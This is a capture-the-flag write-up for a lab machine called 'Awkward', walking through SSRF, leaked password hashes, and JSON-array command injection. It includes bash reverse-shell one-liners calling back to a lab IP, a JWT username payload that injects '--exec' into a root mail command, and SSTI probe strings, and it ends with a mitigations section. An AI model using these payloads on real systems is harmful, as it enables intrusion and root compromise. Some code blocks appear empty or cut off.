This was a difficult box for me. I had to exploit a web application to get Remote Code Execution, find the user's password in an notes file, then exploit the same application a second time to get root.

## Enumeration

I started by enumerating open ports with rustscan.

```bash
$ rustscan -a target -- -A  | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

There were two open ports, 22 (SSH) and 80 (HTTP).

The website was redirecting to `http://hat-valley.htb/`, I added the domain to my hosts file. I scanned the site with Feroxbuster. But it did not find anything useful.

I used wfuzz to look for subdomains. 

```bash

There was one subdomain: `store.hat-valley.htb`. I added it to my hosts file and scanned the site with Feroxbuster. It did not find anything. I tried looking at the site, but it required authentication. 

## Main Site

I looked around the site. There were a few employee profiles. I noted their name in case I could use them as usernames later. There was a form on the bottom, but it did not do anything when I posted it.

I looked at the JavaScript code, it had the [Source Maps](https://developer.chrome.com/blog/sourcemaps/). I opened the Firefox Developers tools to look at it. 

![Source Code](/assets/images/Awkward/SourceCode.png "Source Code")

I opened the router's code and saw that the site was exposing four routes.

```js
const routes = [
  {
    path: "/",
    name: "base",
    component: Base,
  },
  {
    path: "/hr",
    name: "hr",
    component: HR,
  },
  {
    path: "/dashboard",
    name: "dashboard",
    component: Dashboard,
    meta: {
      requiresAuth: true
    }
  },
  {
    path: "/leave",
    name: "leave",
    component: Leave,
    meta: {
      requiresAuth: true
    }
  }
];

const router = createRouter({
  history: createWebHistory(),
  routes,
});

router.beforeEach((to, from, next) => {
  if((to.name == 'leave' || to.name == 'dashboard') && VueCookieNext.getCookie('token') == 'guest') { //if user not logged in, redirect to login
    next({ name: 'hr' })
  }
  else if(to.name == 'hr' && VueCookieNext.getCookie('token') != 'guest') { //if user logged in, skip past login to dashboard
    next({ name: 'dashboard' })
  }
  else {
    next()
  }
})

export default router;
```

The `dashboard` and `leave` endpoints needed a `token` cookie. If it was set to anything other than 'guest', the page would be rendered. I changed my cookie to 'admin' and loaded the dashboard page.

![Dashboard](/assets/images/Awkward/Dashboard.png "Dashboard")

The page loaded. Same with the page to send leave requests.

![Leave Requests](/assets/images/Awkward/LeaveRequest.png "Leave Requests")

But posting a request failed. 

```js

```

My cookie was invalid. It was expecting a JWT. I tried forging one with the `none` algorithm. Especially since I know about a [recent vulnerability](https://security.snyk.io/vuln/SNYK-JS-JSONWEBTOKEN-3180026) in the library it used. But that failed.

The login attempts were posted to `/api/login`.

```http

I tried sending some SQL injections without any results.

I tried NoSQL injection in the username.

It didn't do anything. I tried in the password.

```http
POST /api/login HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

{"username":{

"$ne":""}}
```

It gave me an error. But it did not appear to be used in a database query. It was probably trying to hash the password to validate it. But that hinted that the types of the data were not checked.

### APIs

I looked at the various API calls the application was making. I looked in the services folder in the application code. 

* /api/all-leave - Get the leave requests
* /api/submit-leave - Create a leave request
* /api/login - Login to the application
* /api/staff-details - Get information about the staff
* /api/store-status - Verify if the store is online

Most the calls were failing because of my bad JWT. I tried forging one again, but I failed. 

### Server-Side Request Forgery (SSRF)

The store status API calls were not failing with my token. It was always returning a 200 with no content. I removed the token and got the same result. 

The API was taking a URL parameter. So I immediately thought I could get SSRF. I tried changing the URL to see what would happen. I sent 'http://hat-valley.htb', this time the response contained the main site source code. I tried requesting other pages, but got blank responses. Requesting a JavaScript file worked. It looked like anything that required authentication failed. But still responded with a 200.

I tried setting up a web server on my machine. I could use the status call to request it. I tried using redirects. It worked, but I got the same results as requesting the pages directly in the URL parameter.

I also tried sending a page with multiple Server-Side Templating (SSTI) payloads taken from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#detect). None of them worked.

{% raw %}
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
engine.render("Hello {{"+greeting+"}}", data)
```
{% endraw %}

I thought that maybe there were other ports accessible only on the server. I scanned the ports again, this time with nmap, to see if it would detect any filtered port. It did not. 

### Unauthenticated API Call

I was going to write a small script to try requesting all the ports with the SSRF. But I decided to first add more notes on the different API calls. The fact that the status call was working without the token made me think that they were not all using the same code. And maybe some calls were not correctly protected. 

I went through all the API endpoints. I tried with my 'admin' token, with a generated unsigned token, and without any token.

When I got to the staff details endpoint, I got a nice surprise when I requested it without a token.

```http
GET /api/staff-details HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://hat-valley.htb/dashboard
```

It worked without the JWT.

Even better, it returned the password hashes as part of the payload. I saved them to a file and tried cracking them with hashcat.

I had the password for 'christopher.jones'. I tried the credentials in SSH, but they failed. I tried them on the sites. It worked on the main site but failed in the store.

I had some potential usernames. So I launched Hydra to try to brute force the store login. It went through all rockyou without any success.

## Remote Code Execution

Once connected to the site, I tried the different API calls again. The status call worked the same way. I kept in mind that I still needed to use it to scan ports. But I kept exploring the other calls first.

The call to get the leave requests were now returning two rows.

```
bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
```

The call to submit new leave requests was sending the three fields in JSON. I tried using it to execute code on the server.

```bash
POST /api/submit-leave HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

But some characters were rejected.

HTTP/1.1 500 Internal Server Error

```

I did some experimentation and found that those characters were rejected: {% raw %} ! # $ ? & \* ( ) < \> [ ] { } ; ` \| {% endraw %}.

But those were not:

![Valid Characters](/assets/images/Awkward/ValidChars.png "Valid Characters")

Sending a comma in my payload was very interesting. 

```json
{
  "reason":"re,ason",
  "start":"13/01/2023",
  "end":"13/01/2023"
}
```

![Comma In Payload](/assets/images/Awkward/CommaInPayload.png "Comma In Payload")

It looked like the comma was used as a separator. With the name of the box hinting at the use of `awk`, I pushed more in that direction. There was a [vulnerability in awk](https://bugs.busybox.net/show_bug.cgi?id=14781) released a few months before the box. But I could not exploit it.

I kept experimenting with the payload. And when I tried sending an object as the reason instead of a string, it got interesting.

```json
{
  "reason":{},
  "start":"13/01/2023",
  "end":"13/01/2023"
}
```

The response contained an error. 

```js
TypeError: reason.includes is not a function<br> &nbsp; &nbsp;at /var/www/hat-valley.htb/server/server.js:79:47<br> &nbsp; &nbsp;at Array.some (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at /var/www/hat-valley.htb/server/server.js:79:27<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15<br> &nbsp; &nbsp;at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)<br> &nbsp; &nbsp;at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10)
```

The code was calling `includes` on the passed in reason. It was probably trying to look for the forbidden characters. I tried with an array. 

```json
{
  "reason":[],
  "start":"13/01/2023",
  "end":"13/01/2023"
}
```

This worked. And even better, the array allowed me to bypass the validation.

```json
{
  "reason":[
    "reason$"
  ],
  "start":"13/01/2023",
  "end":"13/01/2023"
}
```

I tried using this to execute code and get a reverse shell.

```json
{
  "reason":[
    "`bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'`"
  ],
  "start":"13/01/2023",
  "end":"13/01/2023"
  }
```

I got a hit on my netcat listener. And I was on the server.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.185] 51432
bash: cannot set terminal process group (1969): Inappropriate ioctl for device
bash: no job control in this shell

www-data@awkward:~/hat-valley.htb$ whoami
whoami
www-data
```

## Lateral Movement 

I looked around the server. I could not run `sudo` as www-data and I did not find any `suid` binary. 

The server.js code of the main application contained some credentials.

```js
const connection = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'REDACTED',
  database: 'hatvalley',
  stringifyObjects: true
})
const port = 3002

const TOKEN_SECRET = "REDACTED"
```

I connected to the database, but it only contained the username and password I already got through the API.

The file `/var/www/private/leave_requests.csv` contained the leave requests from everyone.

```bash
www-data@awkward:~/hat-valley.htb$ cat ../private/leave_requests.csv

```

There were two home folders. One for christine that I could not read. And one for bean that had some readable files and folders.

```

The backup file was interesting. There were some files and folders I could not read. By extracting it, I thought I might be able to read bean's SSH keys. 

```bash
www-data@awkward:~$ mkdir /tmp/test/

www-data@awkward:~$ cd /tmp/test/

www-data@awkward:/tmp/test$ cp /home/bean/Documents/backup/bean_backup_final.tar.gz .

```

Sadly, there were no SSH keys in the backup. I looked at what it contained. I found the `keyrings` file in `.local/share/keyrings/`. I used John to crack it, the password was not in rockyou.

I looked around the backup but did not find anything else at first. So I went back to looking in the server. The store site requires basic authentication. And that was not in the code. So I looked at the configuration of nginx. 

```bash
www-data@awkward:/home/bean$ cat /etc/nginx/sites-enabled/store.conf
server {
    listen       80;
    server_name  store.hat-valley.htb;
    root /var/www/store;

    location / {
        index index.php index.html index.htm;
    }
    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    #
    location ~ /cart/.*\.php$ {
        return 403;
    }
    location ~ /product-details/.*\.php$ {
        return 403;
    }
    location ~ \.php$ {
        auth_basic "Restricted";
        auth_basic_user_file /etc/nginx/conf.d/.htpasswd;
        fastcgi_pass   unix:/var/run/php/php8.1-fpm.sock;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  $realpath_root$fastcgi_script_name;
        include        fastcgi_params;
    }
    # deny access to .htaccess files, if Apache's document root
    # concurs with nginx's one
    #
    #location ~ /\.ht {
    #    deny  all;
    #}
}

www-data@awkward:/home/bean$ cat /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
```

The credentials to access the store were in a .htpasswd file. I had the username, but hashcat failed to break the password hash. I tried login in with all the passwords I had found so far, but still no luck.

I downloaded [pspy](https://github.com/DominicBreuker/pspy) on the server to look at running processes. 

```bash

2023/01/15 04:00:01 CMD: UID=0    PID=32349  | /usr/sbin/postdrop -r
```

The mail command looked interesting, but it was running as root. And at that time I was trying to get in as bean or christine. So I took a note and left it aside.

I went back to the backup and looked deeper into the hidden folders. Eventually, I came across what looked like the auto-save file for [Xpad](https://wiki.gnome.org/Apps/Xpad).

```bash
www-data@awkward:/tmp/test$ cat .config/xpad/content-DS1ZS1

It contained a password and a bolded note to use it everywhere. I used it to connect to the store.

And to SSH.

## Privilege Escalation

Once connected as bean, I thought I needed to find a way to access the user christine. I looked at sudo, suid, cronjobs, ... I did not find anything. 

I read the source code of the store application. It had similar code to deny the use of some characters. And it was using `sed` in the code to remove items from the cart.

I saw that I could create new products by adding files to the `product-details` folder. So I thought maybe I could inject code in there, and get it executed when `sed` was called. But the application was running as www-data, so I left that aside and looked for other things.


### Email Sending

I ran pspy again, and the process that sent the emails keep coming back.

```bash
2023/01/16 00:40:01 CMD: UID=0    PID=4201   | /usr/sbin/sendmail -oi -f root@awkward -t 
2023/01/16 00:40:01 CMD: UID=0    PID=4204   | /usr/sbin/postdrop -r 
2023/01/16 00:40:01 CMD: UID=0    PID=4203   | /usr/sbin/postdrop -r 
2023/01/16 00:40:01 CMD: UID=0    PID=4202   | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root 
2023/01/16 00:40:01 CMD: UID=0    PID=4205   | cleanup -z -t unix -u -c 
2023/01/16 00:40:01 CMD: UID=0    PID=4206   | trivial-rewrite -n rewrite -t unix -u -c 
2023/01/16 00:40:01 CMD: UID=0    PID=4207   | /bin/bash /root/scripts/notify.sh 
2023/01/16 00:40:01 CMD: UID=0    PID=4212   | mail -s Leave Request: bean.hill christine 
2023/01/16 00:40:01 CMD: UID=0    PID=4214   | local -t unix 
2023/01/16 00:40:01 CMD: UID=0    PID=4213   | cleanup -z -t unix -u -c 
2023/01/16 00:40:01 CMD: UID=0    PID=4215   | /usr/sbin/sendmail -oi -f root@awkward -t 
2023/01/16 00:40:01 CMD: UID=0    PID=4217   | local -t unix 
2023/01/16 00:40:01 CMD: UID=0    PID=4216   | /usr/sbin/postdrop -r 
```

It took me a while, but eventually, I realized that the subject of the email contained the username of the requester (Leave Request: bean.hill christine), and that I could control that. 

When I first got a shell on the machine, I found the `TOKEN_SECRET` that was used to generate JWT. I took my token to [jwt.io](https://jwt.io/) to confirm that it worked.

![Signature Verified](/assets/images/Awkward/SignatureVerified.png "Signature Verified")

I tried generating a token with a fake name to see if it would be used in the mail command. I used Burp to send a leave request with my new token and checked what was executed on the server.

```bash
2023/01/16 01:02:46 CMD: UID=0    PID=4320   | mail -s Leave Request: ERIC_WAS_HERE christine
```

It worked! Next, I tried to send some code to execute. 

```json
{
  "username": [";`id`;ls"],
  "iat": 1673727191
}
```
I sent a username with some commands to execute. The `id` was run, but on insertion by www-data. Not by root when sending the email. So that did not help.

```bash
mail -s Leave Request: ;uid=33(www-data) gid=33(www-data) groups=33(www-data);ls christine
```

I needed something that would be executed by mail, not the web server. I found on GTFOBins that [mail](https://gtfobins.github.io/gtfobins/mail/#shell) could be used to run commands.

I struggled a lot to get the payload executed. In the end, I had to double-encode everything, and start with a single `"`.

I created a script on the server and made it executable. 

```bash
bean@awkward:~$ cat /tmp/test.sh
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'
```

Then I sent a username that would use `--exec` on the mail command to run the script.

```json
{
  "username": ["\\\" --exec=\\\"\\!/tmp/test.sh\\\""],
  "iat": 1673727191
}
```
I sent a new request with the generated JWT and I got a hit on my listener.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.185] 35700
bash: cannot set terminal process group (946): Inappropriate ioctl for device
bash: no job control in this shell

root@awkward:~/scripts# whoami
whoami
root

root@awkward:~/scripts# cat /root/root.txt
cat /root/root.txt
REDACTED
```

After I finally got root, I realized that I could have done the same when I got the shell as www-data. The file used to store the leave requests is writable by www-data. So I could add the command to the file and get my shell.

```bash
echo ' " --exec="!/tmp/test.sh"' >> /var/www/private/leave_requests.csv
```

## Mitigations

This box was made vulnerable by a series of mistakes, mostly in the main application.

The source maps are great for developers, but they should not be available in production. They also make life easier for hackers.

The token validation was problematic. If the token was not set to `guest`, then I could access pages that should have been protected. The code should always validate the full token and reject any requests with an invalid token.

The API endpoint to check the store status had no reason to take a URL parameter. The developers should know where the store would be. If they need multiple URLs for different environments, that could be stored in an environment variable instead of allowing the users to query anything they want.

The `staff-details` endpoint was problematic. 

```js
app.get('/api/staff-details', (req, res) => {
  const user_token = req.cookies.token
  var authFailed = false
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
  }
  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }
  connection.query(
    'SELECT * FROM users',
    function (err, results) {
      if(err) {
        return res.status(500).send("Database error")
      }
      else {
        return res.status(200).json(results)
      }
    }
  );

If `user_token` was not defined, then `authFailed` stayed false and we could access all the users. In authentication code, the default should always be a failure until proven that the authentication is successful. This way call is rejected in the case of a forgotten path like here.

Sending the data directly from the database is a bad idea. The code should go through the users and only send the fields that are needed. This way you don't risk sending sensitive data like the password hashes, even if it's added after the code was written.

The way the leave requests were stored also has issues. The code uses the command line to echo the entries in a file and read them. Passing user-supplied values to the command line is always risky. The code tries to reject some characters, but that's clearly not enough. Validating the types of the arguments would have helped. 

The application already has a database to store users. Why not use it for leave requests also? And if the requests needed to be stored in a file, why not use the Node methods to read and write to files?

Once connected, I was able to read the backup of another user. Backups can contain sensitive data and should be protected. The file should not be readable by anyone but the owner. And maybe they could be encrypted.

There was also an issue with bean's password. They entered it in a clear text document. Xpad saved it in clear. I don't know it that was an auto-save file, or where it saves all the notes, but passwords cannot be entered in an unencrypted document. And they should not be reused. 

The last problem was with the code that sent the email when a new leave request was added.

```bash
root@awkward:~/scripts# cat notify.sh
cat notify.sh
#!/bin/bash

inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv | while read; do
        change=$(tail -1 /var/www/private/leave_requests.csv)
        name=`echo $change | awk -F, '{print $1}'`
        echo -e "You have a new leave request to review!\n$change" | mail -s "Leave Request: "$name christine
```

Once again, user's data is used in a command. This code probably takes for granted that the data was sanitized by the code that wrote it to the file. But you should always sanitize the inputs where you use them. Don't trust other code to do it for you. You never know how it can be bypassed.
